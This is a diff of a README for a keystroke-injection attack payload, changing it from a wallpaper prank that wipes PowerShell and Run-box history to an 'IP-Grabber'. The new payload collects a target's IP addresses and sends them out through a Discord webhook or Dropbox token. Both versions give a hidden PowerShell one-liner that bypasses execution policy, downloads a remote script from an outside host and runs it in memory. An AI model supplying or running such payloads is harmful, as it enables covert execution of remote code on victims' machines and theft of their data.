@@ -13,16 +13,11 @@
   </ol>
 </details>
 
-# Wallpaper-URL
-
-This payload will download an image from any URL and set it as the target's wallpaper. 
+# IP-Grabber
 
 ## Description
 
-Use this program to troll your friends. Find any image online and grab the URL and insert it into the PS1 script. 
-Run this payload and step away. Once a mouse movement is detected, their wallpaper will change right in front of their eyes.
-Lastly, to clean up your tracks behind you, the tmp folder will be emptied and the PowerShell and run box history will be wiped.
-
+This payload is meant to do grab your targets IP addresses and exfil them with discord or dropbox
 
 ## Getting Started
 
@@ -30,15 +25,19 @@ Lastly, to clean up your tracks behind you, the tmp folder will be emptied and t
 
 * Windows 10,11
 
-<p align="right">(<a href="#top">back to top</a>)</p>
-
 ### Executing program
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-* Place your images URL in the $url variable
+
+`$dc` is the variable that stores your Discord webhook 
+
+`$db` is the variable that stores your Dropbox token 
+
+Fill in either or both of these to methods to exfil your collected data
+
 ```
-powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE';irm jakoby.lol/pkw | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/f0x | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
